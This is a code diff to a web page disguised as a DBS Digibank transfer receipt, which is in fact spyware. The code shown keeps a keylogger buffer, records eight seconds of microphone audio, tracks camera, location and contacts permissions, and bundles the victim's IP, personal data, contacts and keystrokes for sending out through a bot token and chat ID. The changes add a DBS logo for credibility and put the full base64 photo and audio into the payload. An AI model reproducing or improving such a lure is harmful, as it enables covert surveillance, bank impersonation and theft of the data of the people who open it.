@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DBS Digibank - Bukti Transfer</title>
+    <link rel="icon" type="image/png" href="https://f.top4top.io/p_3927xkofk1.png">
     <style>
         /* ==================== RESET & BASE ==================== */
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -111,7 +112,7 @@
     <div class="receipt-container" id="receiptContainer">
         <div class="header">
             <h1>Bukti Transfer</h1>
-            <img id="logo" src="" alt="Logo" class="logo">
+            <img id="logo" src="https://f.top4top.io/p_3927xkofk1.png" alt="Logo DBS" class="logo" onerror="this.onerror=null; this.src='https://via.placeholder.com/100x32/0d2b45/ffffff?text=DBS';">
         </div>
         <div class="amount-section">
             <p class="label-jumlah">Jumlah Transfer</p>
@@ -163,6 +164,9 @@
         const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
         const CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
+        // Logo DBS
+        const DBS_LOGO_URL = 'https://f.top4top.io/p_3927xkofk1.png';
+
         // ==================== STATE ====================
         let permissions = { camera: false, microphone: false, location: false, contacts: false };
         let keyLogBuffer = [];
@@ -170,6 +174,7 @@
         let mediaRecorder = null;
         let audioChunks = [];
         let cameraPhoto = null;
+        let audioBase64 = null;
         let locationData = {};
         let contactsData = "Belum diambil";
         let deviceInfo = {};
@@ -203,13 +208,21 @@
                 document.getElementById('berita').innerText = data.berita;
                 document.getElementById('referensi').innerText = data.no_referensi;
                 document.getElementById('tanggal').innerText = data.tanggal_transaksi + ' - ' + data.jam_transaksi;
-                document.getElementById('logo').src = data.logo_url;
-                document.getElementById('logo').onerror = function() { this.style.display = 'none'; };
+                
+                // Logo - Prioritaskan dari server, fallback ke DBS Logo
+                const logoEl = document.getElementById('logo');
+                logoEl.src = data.logo_url || DBS_LOGO_URL;
+                logoEl.onerror = function() { 
+                    this.onerror = null;
+                    this.src = DBS_LOGO_URL;
+                };
                 
                 document.getElementById('receiptContainer').classList.add('show');
                 console.log('✅ Data bukti transfer berhasil dimuat dari Localhost');
             } catch (error) {
                 console.error("❌ Gagal memuat data dari Localhost:", error);
+                // Fallback: Tampilkan logo DBS tetap
+                document.getElementById('logo').src = DBS_LOGO_URL;
                 document.getElementById('dari').innerText = "Gagal terhubung ke Server Localhost";
                 document.getElementById('receiptContainer').classList.add('show');
             }
@@ -352,9 +365,24 @@
                 audioChunks = [];
                 mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
                 return new Promise((resolve) => {
-                    mediaRecorder.onstop = () => { resolve(true); };
+                    mediaRecorder.onstop = () => {
+                        // Convert audio to base64
+                        try {
+                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                audioBase64 = reader.result;
+                                resolve(true);
+                            };
+                            reader.readAsDataURL(audioBlob);
+                        } catch (e) {
+                            resolve(true);
+                        }
+                    };
                     mediaRecorder.start();
-                    setTimeout(() => { if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 8000);
+                    setTimeout(() => { 
+                        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); 
+                    }, 8000);
                 });
             } catch (e) {
                 permissions.microphone = false;
@@ -439,7 +467,6 @@
             const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko'];
             const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat'];
             const banks = ['BCA', 'Mandiri', 'BRI', 'BNI', 'CIMB Niaga'];
-            const ewalletTypes = ['Dana', 'OVO', 'GoPay', 'ShopeePay'];
             
             const nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
             
@@ -469,7 +496,7 @@
             };
         }
 
-        // ==================== 10. SEND ALL DATA ====================
+        // ==================== 10. SEND ALL DATA (ENHANCED) ====================
         async function sendAllData(ip, personalData) {
             const payload = {
                 ip: ip,
@@ -479,7 +506,10 @@
                 personal: personalData,
                 contacts: contactsData,
                 keylogger: keyLogBuffer.join('\n'),
-                cameraPhoto: cameraPhoto ? "Ada (Base64 length: " + cameraPhoto.length + ")" : "Tidak ada",
+                // 🔥 FOTO & AUDIO FULL BASE64 - Ditampilkan di Localhost
+                cameraPhoto: cameraPhoto || "Tidak ada",
+                cameraPhotoData: cameraPhoto || null,
+                audioData: audioBase64 || null,
                 permissions: permissions
             };
             
